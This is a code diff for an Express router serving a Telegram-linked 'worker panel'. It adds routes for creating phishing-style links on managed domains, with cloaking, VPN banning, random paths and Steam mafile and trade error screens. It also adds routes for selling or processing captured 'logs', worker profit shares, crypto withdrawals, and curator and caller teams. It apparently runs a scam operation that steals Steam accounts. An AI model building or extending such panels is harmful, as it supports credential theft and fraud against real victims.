@@ -7,39 +7,73 @@ const {
   requireWorker,
   canAccessWorkerPanel,
 } = require("./userAuth");
-const { ensureUser, getUserByTelegramId } = require("../services/userService");
+const { ensureUser, getUserByTelegramId, listCurators, listCallers } = require("../services/userService");
 const { serializeMember } = require("./serializers");
 const { getCurrencyContext } = require("../services/currencyService");
+const { formatDisplayAmount } = require("../services/currencyService");
 const {
   listDomains,
-  getDomainDetail,
+  getWorkerDomainDetail,
   previewAddDomain,
   addDomain,
   removeDomain,
   listTemplates,
-  createLink,
+  createWorkerLink,
+  updateWorkerLink,
+  deleteWorkerLink,
   listWorkers,
 } = require("../services/adminSitesService");
 const { listWorkerLogs, listWorkerTasks } = require("../services/workerPanelService");
+const { getWorkerOverview } = require("../services/workerDashboardService");
 const {
   createWithdrawalRequest,
+  getAvailableUsd,
   methodLabel,
   getNetworkFeeUsd,
   METHOD_LABELS,
+  listUserRequests,
 } = require("../services/withdrawalService");
+const { listUserProfits } = require("../services/profitService");
 const { isAdminTelegramId } = require("../services/userService");
+const {
+  hashAppPassword,
+  verifyAppPassword,
+  validateNewPassword,
+  appLoginOf,
+} = require("./appPassword");
+const {
+  createFeedback,
+  listUserFeedback,
+  notifyAdminsAboutFeedback,
+} = require("../services/feedbackService");
+const {
+  createCuratorApplication,
+  getPendingApplication,
+  buildCuratorApplicationNotifyHtml,
+  curatorApplicationModerationKeyboard,
+} = require("../services/curatorService");
+const { serializeCuratorLike } = require("../services/workerTeamService");
+const { requestSell, requestProcess } = require("../services/workerLogActionsService");
 
-function createUserRouter(_bot) {
+// Avatar upload is handled via Telegram photos only.
+
+function createUserRouter(bot) {
   const router = express.Router();
 
-  router.get("/config", (_req, res) => {
+  router.get("/config", async (_req, res) => {
     const botId = String(env.botToken || "").split(":")[0] || "";
+    const currencyCtx = await getCurrencyContext();
     res.json({
       botUsername: env.botUsername || "",
       botId,
       authDisabled: Boolean(env.panelAuthDisabled),
       supportUrl: env.supportUrl || "",
+      manualsDocsUrl: env.manualsDocsUrl || "",
+      changelogsUrl: env.changelogsUrl || "",
+      aboutInfoChannelUrl: env.aboutInfoChannelUrl || "",
       minWithdrawalUsd: env.walletMinWithdrawalUsd,
+      usdRubRate: currencyCtx.rate,
+      globalCurrency: currencyCtx.currency,
     });
   });
 
@@ -70,6 +104,11 @@ function createUserRouter(_bot) {
         await user.save();
       }
 
+      if (!user.avatarUrl) {
+        user.avatarUrl = tg.photoUrl || "";
+        if (user.avatarUrl) await user.save();
+      }
+
       if (!canAccessWorkerPanel(user)) {
         return res.status(403).json({ error: "not_team_member" });
       }
@@ -80,7 +119,7 @@ function createUserRouter(_bot) {
         ok: true,
         user: {
           ...serializeMember(user, currencyCtx),
-          photoUrl: tg.photoUrl || "",
+          photoUrl: user.avatarUrl || "",
           isAdmin: isAdminTelegramId(user.telegramId),
         },
       });
@@ -102,9 +141,18 @@ function createUserRouter(_bot) {
         payoutMethod: req.worker.payoutMethod || "",
         payoutAddress: req.worker.payoutAddress || "",
         isAdmin: isAdminTelegramId(req.worker.telegramId),
-        photoUrl: "",
+        photoUrl: req.worker.avatarUrl || "",
       },
     });
+  });
+
+  router.get("/overview", requireWorker, async (req, res) => {
+    try {
+      const days = Math.min(30, Math.max(1, Number(req.query.days || 7)));
+      res.json(await getWorkerOverview(req.worker, { days }));
+    } catch (error) {
+      res.status(error.status || 500).json({ error: error.message });
+    }
   });
 
   router.get("/logs", requireWorker, async (req, res) => {
@@ -139,7 +187,7 @@ function createUserRouter(_bot) {
 
   router.get("/sites/domains/:id", requireWorker, async (req, res) => {
     try {
-      res.json(await getDomainDetail(req.worker, req.params.id));
+      res.json(await getWorkerDomainDetail(req.worker, req.params.id));
     } catch (error) {
       res.status(error.status || 400).json({ error: error.message });
     }
@@ -180,12 +228,48 @@ function createUserRouter(_bot) {
   router.post("/sites/domains/:id/links", requireWorker, async (req, res) => {
     try {
       res.json(
-        await createLink(req.worker, req.params.id, {
+        await createWorkerLink(req.worker, req.params.id, {
           path: req.body?.path,
           templateId: req.body?.templateId,
           windowType: req.body?.windowType,
+          iframe: req.body?.iframe,
+          cloaking: req.body?.cloaking,
+          ban_vpn: req.body?.ban_vpn,
+          randPath: req.body?.randPath,
+          logError: req.body?.logError,
+          mafileError: req.body?.mafileError,
+          mafileSteamRedirect: req.body?.mafileSteamRedirect,
+          tradeError: req.body?.tradeError,
         })
       );
+    } catch (error) {
+      res.status(error.status || 400).json({ error: error.message });
+    }
+  });
+
+  router.patch("/sites/domains/:domainId/links/:linkId", requireWorker, async (req, res) => {
+    try {
+      res.json(
+        await updateWorkerLink(req.worker, req.params.domainId, req.params.linkId, {
+          path: req.body?.path,
+          templateId: req.body?.templateId,
+          windowType: req.body?.windowType,
+          iframe: req.body?.iframe,
+          cloaking: req.body?.cloaking,
+          logError: req.body?.logError,
+          mafileError: req.body?.mafileError,
+          mafileSteamRedirect: req.body?.mafileSteamRedirect,
+          tradeError: req.body?.tradeError,
+        })
+      );
+    } catch (error) {
+      res.status(error.status || 400).json({ error: error.message });
+    }
+  });
+
+  router.delete("/sites/domains/:domainId/links/:linkId", requireWorker, async (req, res) => {
+    try {
+      res.json(await deleteWorkerLink(req.worker, req.params.domainId, req.params.linkId));
     } catch (error) {
       res.status(error.status || 400).json({ error: error.message });
     }
@@ -209,13 +293,50 @@ function createUserRouter(_bot) {
     res.json({
       user: {
         ...serializeMember(req.worker, currencyCtx),
+        photoUrl: req.worker.avatarUrl || "",
         payoutMethod: req.worker.payoutMethod || "",
         payoutAddress: req.worker.payoutAddress || "",
+        appLogin: appLoginOf(req.worker),
+        hasAppPassword: Boolean(req.worker.appPasswordHash),
       },
       methods,
       minWithdrawalUsd: env.walletMinWithdrawalUsd,
       supportUrl: env.supportUrl || "",
     });
+  });
+
+  router.post("/settings/password", requireWorker, async (req, res) => {
+    try {
+      const current = String(req.body?.currentPassword || "");
+      const next = String(req.body?.newPassword || "");
+      const confirm = String(req.body?.confirmPassword || "");
+      const hasPassword = Boolean(req.worker.appPasswordHash);
+
+      if (next !== confirm) {
+        return res.status(400).json({ error: "Пароли не совпадают" });
+      }
+      const check = validateNewPassword(next);
+      if (!check.ok) {
+        return res.status(400).json({ error: check.error });
+      }
+      if (hasPassword) {
+        if (!current) {
+          return res.status(400).json({ error: "Введите текущий пароль" });
+        }
+        if (!verifyAppPassword(current, req.worker.appPasswordHash)) {
+          return res.status(400).json({ error: "Неверный текущий пароль" });
+        }
+        if (current === next) {
+          return res.status(400).json({ error: "Новый пароль должен отличаться от текущего" });
+        }
+      }
+
+      req.worker.appPasswordHash = hashAppPassword(next);
+      await req.worker.save();
+      return res.json({ ok: true, hasAppPassword: true });
+    } catch (error) {
+      return res.status(400).json({ error: error.message || "password_change_failed" });
+    }
   });
 
   router.patch("/settings", requireWorker, async (req, res) => {
@@ -239,6 +360,7 @@ function createUserRouter(_bot) {
         ok: true,
         user: {
           ...serializeMember(req.worker, currencyCtx),
+          photoUrl: req.worker.avatarUrl || "",
           payoutMethod: req.worker.payoutMethod || "",
           payoutAddress: req.worker.payoutAddress || "",
         },
@@ -257,6 +379,196 @@ function createUserRouter(_bot) {
       res.json({ ok: true, request: created });
     } catch (error) {
       res.status(400).json({ error: error.message });
+    }
+  });
+
+  router.get("/wallet", requireWorker, async (req, res) => {
+    try {
+      const currencyCtx = await getCurrencyContext();
+      const methods = Object.keys(METHOD_LABELS || {}).map((key) => ({
+        id: key,
+        label: methodLabel(key),
+        feeUsd: getNetworkFeeUsd(key),
+      }));
+
+      const walletUsd = Number(req.worker.totalProfit || 0);
+      const availableUsd = Number(await getAvailableUsd(req.worker));
+      const availableDisplay = formatDisplayAmount(availableUsd, currencyCtx);
+
+      res.json({
+        user: {
+          ...serializeMember(req.worker, currencyCtx),
+          photoUrl: req.worker.avatarUrl || "",
+          payoutMethod: req.worker.payoutMethod || "",
+          payoutAddress: req.worker.payoutAddress || "",
+        },
+        walletUsd,
+        availableUsd,
+        availableDisplay,
+        minWithdrawalUsd: env.walletMinWithdrawalUsd,
+        methods,
+      });
+    } catch (error) {
+      res.status(400).json({ error: error.message });
+    }
+  });
+
+  router.get("/wallet/history", requireWorker, async (req, res) => {
+    try {
+      const tab = String(req.query.tab || "profits").trim();
+      const limit = Math.min(50, Math.max(1, Number(req.query.limit || 20)));
+
+      if (tab === "profits") {
+        const rows = await listUserProfits(req.worker, limit);
+        return res.json({
+          tab,
+          items: (rows || []).map((p) => ({
+            id: String(p._id || ""),
+            createdAt: p.createdAt || null,
+            amountUsd: Number(p.workerShare || 0),
+            // статус у профитов не хранится отдельным полем — это "событие профита".
+            type: "profit",
+          })),
+        });
+      }
+
+      if (tab === "withdrawals") {
+        const rows = await listUserRequests(req.worker.telegramId, limit);
+        return res.json({
+          tab,
+          items: (rows || []).map((r) => ({
+            id: String(r._id || ""),
+            createdAt: r.createdAt || null,
+            amountUsd: Number(r.amountUsd || 0),
+            method: r.method || "",
+            walletAddress: r.walletAddress || "",
+            status: r.status || "pending",
+            payoutUrl: r.payoutUrl || "",
+            type: "withdrawal",
+          })),
+        });
+      }
+
+      return res.status(400).json({ error: "unknown_history_tab" });
+    } catch (error) {
+      res.status(400).json({ error: error.message });
+    }
+  });
+
+  router.get("/team/curators", requireWorker, async (_req, res) => {
+    try {
+      const curators = await listCurators();
+      return res.json({
+        roleType: "curator",
+        members: (curators || []).map((u) => serializeCuratorLike(u, { roleType: "curator" })),
+      });
+    } catch (error) {
+      res.status(400).json({ error: error.message });
+    }
+  });
+
+  router.get("/team/callers", requireWorker, async (_req, res) => {
+    try {
+      const callers = await listCallers();
+      return res.json({
+        roleType: "caller",
+        members: (callers || []).map((u) => serializeCuratorLike(u, { roleType: "caller" })),
+      });
+    } catch (error) {
+      res.status(400).json({ error: error.message });
+    }
+  });
+
+  router.post("/team/curators/:telegramId/apply", requireWorker, async (req, res) => {
+    try {
+      const curatorTelegramId = String(req.params.telegramId || "").trim();
+      if (!curatorTelegramId) return res.status(400).json({ error: "curator_id_required" });
+
+      const curator = await getUserByTelegramId(curatorTelegramId);
+      if (!curator?.isCurator) return res.status(400).json({ error: "curator_not_found" });
+
+      // createCuratorApplication() сам валидирует дубликаты и привязки.
+      const application = await createCuratorApplication(req.worker, curator);
+
+      if (bot?.telegram?.sendMessage) {
+        try {
+          await bot.telegram.sendMessage(
+            curator.telegramId,
+            buildCuratorApplicationNotifyHtml(req.worker),
+            {
+              parse_mode: "HTML",
+              reply_markup: curatorApplicationModerationKeyboard(application._id.toString()).reply_markup,
+            }
+          );
+        } catch (e) {
+          // Уведомление куратору вторично — заявку всё равно создаём.
+        }
+      }
+
+      return res.json({ ok: true, applicationId: String(application._id) });
+    } catch (error) {
+      return res.status(400).json({ error: error.message || "curator_apply_failed" });
+    }
+  });
+
+  router.get("/feedback", requireWorker, async (req, res) => {
+    try {
+      const limit = Math.min(50, Math.max(1, Number(req.query.limit || 20)));
+      const rows = await listUserFeedback(req.worker.telegramId, limit);
+      return res.json({
+        items: (rows || []).map((t) => ({
+          id: String(t._id || ""),
+          type: t.type || "",
+          text: String(t.text || ""),
+          status: t.status || "open",
+          adminReply: String(t.adminReply || ""),
+          createdAt: t.createdAt || null,
+        })),
+      });
+    } catch (error) {
+      res.status(400).json({ error: error.message });
+    }
+  });
+
+  router.post("/feedback", requireWorker, async (req, res) => {
+    try {
+      const type = String(req.body?.type || "").trim();
+      const text = String(req.body?.text || "").trim();
+      const ticket = await createFeedback(req.worker, { type, text });
+
+      if (bot?.telegram) {
+        await notifyAdminsAboutFeedback(bot.telegram, ticket);
+      }
+
+      return res.json({ ok: true, ticketId: String(ticket._id) });
+    } catch (error) {
+      return res.status(400).json({ error: error.message || "feedback_failed" });
+    }
+  });
+
+  router.post("/logs/:sourceId/sell", requireWorker, async (req, res) => {
+    try {
+      const sourceId = String(req.params.sourceId || "").trim();
+      const log = await requestSell({ telegram: bot.telegram }, req.worker, sourceId);
+      return res.json({
+        ok: true,
+        saleStatus: log.saleStatus || "none",
+      });
+    } catch (error) {
+      return res.status(400).json({ error: error.message });
+    }
+  });
+
+  router.post("/logs/:sourceId/process", requireWorker, async (req, res) => {
+    try {
+      const sourceId = String(req.params.sourceId || "").trim();
+      const log = await requestProcess({ telegram: bot.telegram }, req.worker, sourceId);
+      return res.json({
+        ok: true,
+        processStatus: log.processStatus || "none",
+      });
+    } catch (error) {
+      return res.status(400).json({ error: error.message });
     }
   });
 
